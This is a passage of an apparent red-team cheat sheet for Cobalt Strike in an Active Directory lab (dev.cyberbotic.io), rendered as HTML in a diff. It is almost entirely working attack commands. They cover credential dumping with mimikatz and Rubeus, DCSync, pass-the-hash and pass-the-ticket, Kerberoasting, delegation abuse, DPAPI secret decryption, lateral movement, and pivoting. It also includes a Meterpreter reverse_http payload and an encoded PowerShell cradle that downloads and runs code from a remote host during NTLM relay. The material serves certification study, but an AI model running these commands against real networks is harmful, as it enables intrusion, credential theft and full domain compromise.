+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
+<span class="hljs-comment"># Dump the TGT Ticket from given Logon Session (LUID)</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x7049f /service:krbtgt
+
+<span class="hljs-comment"># DC Sync</span>
+beacon&gt; make_token DEV\nlamb F3rrari
+beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt
+
+<span class="hljs-comment"># Dump krbtgt hash from DC (locally)</span>
+beacon&gt; mimikatz !lsadump::lsa /inject /name:krbtgt
+</code></pre>
+<h3 class="code-line" data-line-start=475 data-line-end=476 ><a id="Domain_Recon_475"></a>Domain Recon</h3>
+<ul>
+<li class="has-line-data" data-line-start="477" data-line-end="479">Domain Recon using Power View</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="480" data-line-end="550" class="language-powershell"><span class="hljs-comment"># Use PowerView for domain enumeration</span>
+beacon&gt; powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+
+<span class="hljs-comment"># Get Domain Information</span>
+beacon&gt; powerpick Get-Domain -Domain &lt;&gt;
+
+<span class="hljs-comment"># Get Domain SID</span>
+beacon&gt; powerpick Get-DomainSID
+
+<span class="hljs-comment"># Get Domain Controller</span>
+beacon&gt; powerpick Get-DomainController | select Forest, Name, OSVersion | fl
+
+<span class="hljs-comment"># Get Forest Information</span>
+beacon&gt; powerpick Get-ForestDomain -Forest &lt;&gt;
+
+<span class="hljs-comment"># Get Domain Policy </span>
+beacon&gt; powerpick Get-DomainPolicyData | select -expand SystemAccess
+
+<span class="hljs-comment"># Get Domain users</span>
+beacon&gt; powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl
+
+<span class="hljs-comment"># Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation</span>
+beacon&gt; powerpick Get-DomainUser | select cn,serviceprincipalname
+beacon&gt; powerpick Get-DomainUser -PreauthNotRequired
+beacon&gt; powerpick Get-DomainUser -TrustedToAuth
+
+<span class="hljs-comment"># Get Domain Computer</span>
+beacon&gt; powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
+
+<span class="hljs-comment"># Idenitify Computer Accounts where unconstrained and constrained delefation is enabled</span>
+beacon&gt; powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname
+beacon&gt; powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto
+
+<span class="hljs-comment"># Get Domain OU</span>
+beacon&gt; powerpick Get-DomainOU -Properties Name | sort -Property Name
+
+<span class="hljs-comment"># Identify computers in given OU</span>
+beacon&gt; powerpick Get-DomainComputer -SearchBase <span class="hljs-string">"OU=Workstations,DC=dev,DC=cyberbotic,DC=io"</span> | select dnsHostName
+
+<span class="hljs-comment"># Get Domain group (Use -Recurse Flag)</span>
+beacon&gt; powerpick Get-DomainGroup | where Name <span class="hljs-operator">-like</span> <span class="hljs-string">"*Admins*"</span> | select SamAccountName
+
+<span class="hljs-comment"># Get Domain Group Member</span>
+beacon&gt; powerpick Get-DomainGroupMember -Identity <span class="hljs-string">"Domain Admins"</span> | select MemberDistinguishedName
+beacon&gt; powerpick Get-DomainGroupMember -Identity <span class="hljs-string">"Domain Admins"</span> -Recurse | select MemberDistinguishedName
+
+<span class="hljs-comment"># Get Domain GPO</span>
+beacon&gt; powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
+
+<span class="hljs-comment"># Find the System where given GPO are applicable</span>
+beacon&gt; powerpick Get-DomainOU -GPLink <span class="hljs-string">"{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}"</span> | select distinguishedName
+
+<span class="hljs-comment"># Idenitfy domain users/group who have local admin via Restricted group or GPO </span>
+beacon&gt; powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
+
+<span class="hljs-comment"># Enumerates the machines where a specific domain user/group has local admin rights</span>
+beacon&gt; powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
+
+<span class="hljs-comment"># Get Domain Trusts</span>
+beacon&gt; powerpick Get-DomainTrust
+
+<span class="hljs-comment"># Find Local Admin Access on other domain computers based on context of current user</span>
+beacon&gt; powerpick Find-LocalAdminAccess
+beacon&gt; powerpick Invoke-CheckLocalAdminAccess -ComputerName &lt;server_fqdn&gt;
+
+beacon&gt; powerpick Invoke-UserHunter
+beacon&gt; powerpick Find-PSRemotingLocalAdminAccess -ComputerName &lt;server_fqdn&gt;
+beacon&gt; powerpick Find-WMILocalAdminAccess -ComputerName &lt;server_fqdn&gt;
+
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="551" data-line-end="553">Domain recon using SharpView binary</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="554" data-line-end="556" class="language-powershell">beacon&gt; execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="557" data-line-end="559">Domain recon using ADSearch</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="560" data-line-end="581" class="language-powershell">
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"objectCategory=user"</span>
+
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=group)(cn=*Admins*))"</span>
+
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=group)(cn=MS SQL Admins))"</span> --attributes cn,member
+
+<span class="hljs-comment"># Kerberostable Users</span>
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=user)(servicePrincipalName=*))"</span> --attributes cn,servicePrincipalName,samAccountName
+
+<span class="hljs-comment"># ASEPROAST</span>
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"</span> --attributes cn,distinguishedname,samaccountname
+
+<span class="hljs-comment"># Unconstrained Delegation</span>
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> --attributes samaccountname,dnshostname
+
+<span class="hljs-comment"># Constrained Delegation</span>
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))"</span> --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
+
+<span class="hljs-comment"># Additionally, the `--json` parameter can be used to format the output in JSON</span>
+</code></pre>
+<h3 class="code-line" data-line-start=582 data-line-end=583 ><a id="User_Impersonation_582"></a>User Impersonation</h3>
+<ul>
+<li class="has-line-data" data-line-start="584" data-line-end="586">Pass The Hash Attack</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="587" data-line-end="598" class="language-powershell">beacon&gt; getuid
+beacon&gt; ls \\web.dev.cyberbotic.io\c$
+
+<span class="hljs-comment"># PTH using inbuild method in CS (internally uses Mimikatz)</span>
+beacon&gt; pth DEV\jking <span class="hljs-number">59</span>fc0f884922b4ce376051134c71e22c
+
+<span class="hljs-comment"># Find Local Admin Access</span>
+beacon&gt; powerpick Find-LocalAdminAccess
+
+beacon&gt; rev2self
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="599" data-line-end="601">Pass The Ticket Attack</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="602" data-line-end="613" class="language-powershell"><span class="hljs-comment"># Create a sacrificial token with dummy credentials</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
+
+<span class="hljs-comment"># Inject the TGT ticket into logon session returned as output of previous command</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:<span class="hljs-number">0</span>x798c2c /ticket:doIFuj[...snip...]lDLklP
+
+<span class="hljs-comment"># OR Combine above 2 steps in one</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj[...snip...]lDLklP 
+
+beacon&gt; steal_token <span class="hljs-number">4748</span>
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="614" data-line-end="616">OverPass The Hash</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="617" data-line-end="622" class="language-powershell">beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:<span class="hljs-number">59</span>fc0f884922b4ce376051134c71e22c /nowrap
+
+<span class="hljs-comment"># Use aes256 hash for better opsec, along with /domain and /opsec flags (better opsec)</span>
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:<span class="hljs-number">4</span>a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="623" data-line-end="625">Token Impersonation &amp; Proces Injection</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="626" data-line-end="630" class="language-powershell">beacon&gt; steal_token <span class="hljs-number">4464</span>
+beacon&gt; inject <span class="hljs-number">4464</span> x64 tcp-local
+beacon&gt; shinject /path/to/binary
+</code></pre>
+<h3 class="code-line" data-line-start=631 data-line-end=632 ><a id="Lateral_Movement_631"></a>Lateral Movement</h3>
+<pre><code class="has-line-data" data-line-start="634" data-line-end="656" class="language-powershell"><span class="hljs-comment"># using Jump</span>
+beacon&gt; jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener
+
+<span class="hljs-comment"># Using remote exec</span>
+beacon&gt; remote-exec psexec/winrm/wmi ComputerName &lt;uploaded binary on remote system&gt;
+
+<span class="hljs-comment"># Example Windows Management Instrumentation (WMI)</span>
+beacon&gt; cd \\web.dev.cyberbotic.io\ADMIN$
+beacon&gt; upload C:\Payloads\smb_x64.exe
+beacon&gt; remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe
+beacon&gt; link web.dev.cyberbotic.io TSVCPIPE-<span class="hljs-number">81180</span>acb-<span class="hljs-number">0512</span>-<span class="hljs-number">44</span>d7-<span class="hljs-number">81</span>fd-fbfea25fff10
+
+<span class="hljs-comment"># Executing .Net binary remotely </span>
+beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web
+
+<span class="hljs-comment"># Invoke DCOM (better opsec)</span>
+beacon&gt; powershell-import C:\Tools\Invoke-DCOM.ps1
+beacon&gt; powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
+beacon&gt; link web.dev.cyberbotic.io agent_vinod
+
+NOTE: <span class="hljs-keyword">While</span> using remote-exec <span class="hljs-keyword">for</span> lateral movement, kindly generate the windows service binary as psexec creates a windows service pointing to uploaded binary <span class="hljs-keyword">for</span> execution 
+</code></pre>
+<h3 class="code-line" data-line-start=657 data-line-end=658 ><a id="Session_Passing_657"></a>Session Passing</h3>
+<pre><code class="has-line-data" data-line-start="660" data-line-end="692" class="language-powershell"><span class="hljs-comment"># CASE 1: Beacon Passing (Within Cobalt Strike - Create alternate HTTP beacon while keeping DNS as lifeline)</span>
+beacon&gt; spawn x64 http
+
+<span class="hljs-comment"># CASE 2: Foreign Listener (From CS to Metasploit - Staged Payload - only x86 payloads)</span>
+
+<span class="hljs-comment"># Setup Metasploit listener</span>
+attacker@ubuntu ~&gt; sudo msfconsole -q
+msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http
+msf6 exploit(multi/handler) &gt; set LHOST ens5
+msf6 exploit(multi/handler) &gt; set LPORT <span class="hljs-number">8080</span>
+msf6 exploit(multi/handler) &gt; run
+
+<span class="hljs-comment"># Setup a Foreign Listener in cobalt strike with above IP &amp; port details</span>
+
+<span class="hljs-comment"># Use Jump psexec to execute the beacon payload and pass the session</span>
+beacon&gt; jump psexec Foreign_listener
+
+<span class="hljs-comment"># CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)</span>
+
+<span class="hljs-comment"># Setup up metasploit</span>
+msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_http
+msf6 exploit(multi/handler) &gt; exploit
+
+<span class="hljs-comment"># Generate binary</span>
+ubuntu@DESKTOP-<span class="hljs-number">3</span>BSK7NO ~&gt; msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">5.50</span> LPORT=<span class="hljs-number">8080</span> -f raw -o /mnt/c/Payloads/msf_http_x64.bin
+
+<span class="hljs-comment"># Inject msf shellcode into process memory</span>
+beacon&gt; shspawn x64 C:\Payloads\msf_http_x64.bin
+
+</code></pre>
+<h3 class="code-line" data-line-start=693 data-line-end=694 ><a id="Pivoting_693"></a>Pivoting</h3>
+<pre><code class="has-line-data" data-line-start="696" data-line-end="755" class="language-powershell"><span class="hljs-comment"># Enable Socks Proxy in beacon session (Use SOCKS 5 for better OPSEC)</span>
+beacon&gt; socks <span class="hljs-number">1080</span> socks5 disableNoAuth socks_user socks_password enableLogging
+
+<span class="hljs-comment"># Verify the SOCKS proxy on team server</span>
+attacker@ubuntu ~&gt; sudo ss -lpnt
+
+<span class="hljs-comment"># Configure Proxychains in Linux</span>
+$ sudo vim /etc/proxychains.conf
+socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span> socks_user socks_password
+
+<span class="hljs-variable">$attacker</span>@ubuntu ~&gt; proxychains nmap -n -Pn -sT -p445,<span class="hljs-number">3389</span>,<span class="hljs-number">4444</span>,<span class="hljs-number">5985</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">122.10</span>
+ubuntu@DESKTOP-<span class="hljs-number">3</span>BSK7NO ~ &gt; proxychains wmiexec.py DEV/jking@<span class="hljs-number">10.10</span>.<span class="hljs-number">122.30</span>
+
+<span class="hljs-comment"># Use Proxifier for Windows environment </span>
+ps&gt; runas /netonly /user:dev/bfarmer mmc.exe
+ps&gt; mimikatz <span class="hljs-comment"># privilege::debug</span>
+ps&gt; mimikatz <span class="hljs-comment"># sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe</span>
+PS C:\Users\Attacker&gt; <span class="hljs-variable">$cred</span> = <span class="hljs-built_in">Get-Credential</span>
+PS C:\Users\Attacker&gt; Get-ADComputer -Server <span class="hljs-number">10.10</span>.<span class="hljs-number">122.10</span> -Filter * -Credential <span class="hljs-variable">$cred</span> | select
+
+<span class="hljs-comment"># Use FoxyProxy plugin to access Webportal via SOCKS Proxy</span>
+
+<span class="hljs-comment"># Reverse Port Forward (if teamserver is not directly accessible, then use rportfwd to redirect traffic)</span>
+beacon&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">80</span>
+beacon&gt; run netstat -anp tcp
+ps&gt; iwr -Uri http://wkstn-<span class="hljs-number">2</span>:<span class="hljs-number">8080</span>/a
+
+beacon&gt; powershell New-NetFirewallRule -DisplayName <span class="hljs-string">"Test Rule"</span> -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <span class="hljs-number">8080</span>
+beacon&gt; powershell Remove-NetFirewallRule -DisplayName <span class="hljs-string">"Test Rule"</span>
+
+<span class="hljs-comment"># NTLM Relay</span>
+
+<span class="hljs-number">1</span>. Setup SOCKS Proxy on the beacon
+beacon&gt; socks <span class="hljs-number">1080</span> socks5 disableNoAuth socks_user socks_password enableLogging
+
+<span class="hljs-number">2</span>. Setup Proxychains to use this proxy
+$ sudo vim /etc/proxychains.conf
+socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span> socks_user socks_password
+
+<span class="hljs-number">3</span>. Use Proxychain to send NTLMRelay traffic to beacon targeting DC and encoded SMB Payload <span class="hljs-keyword">for</span> execution
+$ sudo proxychains ntlmrelayx.py -t smb://<span class="hljs-number">10.10</span>.<span class="hljs-number">122.10</span> -smb2support --no-http-server --no-wcf-server -c <span class="hljs-string">'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='</span>
+
+<span class="hljs-comment"># iex (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")</span>
+
+<span class="hljs-number">4</span>. Setup reverse port forwarding 
+beacon&gt; rportfwd <span class="hljs-number">8080</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">80</span>
+beacon&gt; rportfwd <span class="hljs-number">8445</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">445</span>
+
+<span class="hljs-number">5</span>. Upload PortBender driver and load its .cna file
+beacon&gt; cd C:\Windows\system32\drivers
+beacon&gt; upload C:\Tools\PortBender\WinDivert64.sys
+beacon&gt; PortBender redirect <span class="hljs-number">445</span> <span class="hljs-number">8445</span>
+
+<span class="hljs-number">6</span>. Manually <span class="hljs-keyword">try</span> to access share on our system or use MSPRN, Printspooler to force authentication
+
+<span class="hljs-number">7</span>. Verify the access <span class="hljs-keyword">in</span> weblog and use link command to connect with SMB beacon
+beacon&gt; link dc-<span class="hljs-number">2</span>.dev.cyberbotic.io TSVCPIPE-<span class="hljs-number">81180</span>acb-<span class="hljs-number">0512</span>-<span class="hljs-number">44</span>d7-<span class="hljs-number">81</span>fd-fbfea25fff10
+
+</code></pre>
+<h3 class="code-line" data-line-start=756 data-line-end=757 ><a id="Data_Protection_API_756"></a>Data Protection API</h3>
+<pre><code class="has-line-data" data-line-start="759" data-line-end="804" class="language-powershell"><span class="hljs-comment"># Use mimikatz to dump secrets from windows vault</span>
+beacon&gt; mimikatz !vault::list
+beacon&gt; mimikatz !vault::cred /patch
+
+<span class="hljs-comment"># Part 1: Enumerate stored credentials</span>
+
+<span class="hljs-number">0</span>. Check <span class="hljs-keyword">if</span> system has credentials stored <span class="hljs-keyword">in</span> either web or windows vault
+beacon&gt; run vaultcmd /list
+beacon&gt; run vaultcmd /listcreds:<span class="hljs-string">"Windows Credentials"</span> /all
+beacon&gt; run vaultcmd /listcreds:<span class="hljs-string">"Web Credentials"</span> /all
+beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
+
+<span class="hljs-comment"># Part 2.1: Scheduled Task Credentials</span>
+
+<span class="hljs-number">1</span>. Credentials <span class="hljs-keyword">for</span> task scheduler are stored at below location <span class="hljs-keyword">in</span> encrypted blob
+beacon&gt; ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+<span class="hljs-number">2</span>. Find the GUID of Master key associated with encrypted blob (F31...B6E)
+beacon&gt; mimikatz dpapi::cred /<span class="hljs-keyword">in</span>:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
+
+<span class="hljs-number">3</span>. Dump all the master keys and <span class="hljs-keyword">filter</span> the one we need based on GUID identified <span class="hljs-keyword">in</span> previous step
+beacon&gt; mimikatz !sekurlsa::dpapi
+
+<span class="hljs-number">4</span>. Use the Encrypted Blob and Master Key to decrypt and extract plain text password
+beacon&gt; mimikatz dpapi::cred /<span class="hljs-keyword">in</span>:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:<span class="hljs-number">10530</span>dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
+
+<span class="hljs-comment"># Part 2.2: Extracting stored RDP Password </span>
+
+<span class="hljs-number">1</span>. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)
+beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles
+
+<span class="hljs-number">2</span>. Verify the credential blob <span class="hljs-keyword">in</span> users cred directory (Note enc blob ID)
+beacon&gt; ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials
+
+<span class="hljs-number">3</span>. Master key is stored <span class="hljs-keyword">in</span> users Protect directory (Note GUID of master key matching with Seatbelt)
+beacon&gt; ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span>-<span class="hljs-number">1104</span>
+
+<span class="hljs-number">4</span>. Decrypt the master key (Need to be execute <span class="hljs-keyword">in</span> context of user who owns the key, use @ modifier)
+beacon&gt; mimikatz !sekurlsa::dpapi
+beacon&gt; mimikatz dpapi::masterkey /<span class="hljs-keyword">in</span>:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">569305411</span>-<span class="hljs-number">121244042</span>-<span class="hljs-number">2357301523</span>-<span class="hljs-number">1104</span>\bfc5090d-<span class="hljs-number">22</span>fe-<span class="hljs-number">4058</span>-<span class="hljs-number">8953</span>-<span class="hljs-number">47</span>f6882f549e /rpc
+
+<span class="hljs-number">5</span>. Use Master key to decrypt the credentials blob
+beacon&gt; mimikatz dpapi::cred /<span class="hljs-keyword">in</span>:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\<span class="hljs-number">6</span>C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:<span class="hljs-number">8</span>d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
+
+</code></pre>
+<h3 class="code-line" data-line-start=805 data-line-end=806 ><a id="Kerberos_805"></a>Kerberos</h3>
+<pre><code class="has-line-data" data-line-start="808" data-line-end="918" class="language-powershell">
+<span class="hljs-comment"># Kerberosting</span>
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=user)(servicePrincipalName=*))"</span> --attributes cn,servicePrincipalName,samAccountName
+
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
+
+ps&gt; hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">13100</span> hashes wordlist
+
+<span class="hljs-comment"># ASREPRoast</span>
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"</span> --attributes cn,distinguishedname,samaccountname
+
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
+
+ps&gt; hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">18200</span> svc_oracle wordlist
+
+<span class="hljs-comment"># Unconstrained Delegation (Caches TGT of any user accessing its service)</span>
+
+<span class="hljs-number">1</span>. Identify the computer objects having Unconstrained Delegation enabled
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> --attributes samaccountname,dnshostname
+
+<span class="hljs-number">2</span>. Dumping the cached TGT ticket (requires system access on affected system)
+beacon&gt; getuid
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x14794e /nowrap
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:<span class="hljs-number">10</span> /nowrap
+
+<span class="hljs-number">3</span>. Execute PrintSpool attack to force DC to authenticate with WEB 
+beacon&gt; execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-<span class="hljs-number">2</span>.dev.cyberbotic.io web.dev.cyberbotic.io
+
+<span class="hljs-number">4</span>. Use Machine TGT (DC) fetched to gain RCE on itself using S4U abuse (/self flag)
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-<span class="hljs-number">2</span>.dev.cyberbotic.io /user:dc-<span class="hljs-number">2</span>$ /ticket:doIFuj[...]lDLklP /nowrap
+
+<span class="hljs-number">5</span>. Inject the ticket and access the service
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=
+
+beacon&gt; steal_token <span class="hljs-number">2664</span>
+beacon&gt; ls \\dc-<span class="hljs-number">2</span>.dev.cyberbotic.io\c$
+
+
+<span class="hljs-comment"># Constrained Delegation (allows to request TGS for any user using its TGT)</span>
+
+<span class="hljs-number">1</span>. Identify the computer objects having Constrained Delegation is enabled
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))"</span> --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
+
+<span class="hljs-number">2</span>. Dump the TGT of User/Computer Account having constrained Delegation enabled (use asktgt <span class="hljs-keyword">if</span> NTLM hash)
+beacon&gt; getuid
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:<span class="hljs-number">0</span>x3e4 /service:krbtgt /nowrap
+
+<span class="hljs-number">3</span>. Use S4U technique to request TGS <span class="hljs-keyword">for</span> delegated service using machines TGT (Use S4U2Proxy tkt)
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-<span class="hljs-number">2</span>.dev.cyberbotic.io /user:sql-<span class="hljs-number">2</span>$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
+
+<span class="hljs-number">4</span>. OR, Access other alternate Service not stated <span class="hljs-keyword">in</span> Delegation attribute (ldap)
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-<span class="hljs-number">2</span>.dev.cyberbotic.io /altservice:ldap /user:sql-<span class="hljs-number">2</span>$ /ticket:doIFpD[...]MuSU8= /nowrap
+
+<span class="hljs-number">5</span>. Inject the S4U2Proxy tkt from previous step
+beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
+
+<span class="hljs-number">6</span>. Access the services 
+beacon&gt; steal_token <span class="hljs-number">5540</span>
+beacon&gt; ls \\dc-<span class="hljs-number">2</span>.dev.cyberbotic.io\c$
+beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt
+
+
+<span class="hljs-comment"># Resource-Based Constrained Delegation (Systems having writable msDS-AllowedToActOnBehalfOfOtherIdentity)</span>
+
+<span class="hljs-number">1</span>. Identify the Computer Objects which has AllowedToActOnBehalfOfOtherIdentity attribute defined
+beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span class="hljs-string">"(&amp;(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))"</span> --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json
+
+<span class="hljs-number">2</span>. OR, Identify the Domain Computer where we can write this atribute with custom value 
+beacon&gt; powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { <span class="hljs-variable">$_</span>.ActiveDirectoryRights <span class="hljs-operator">-match</span> <span class="hljs-string">"WriteProperty|GenericWrite|GenericAll|WriteDacl"</span> -and <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">"S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}"</span> }
+
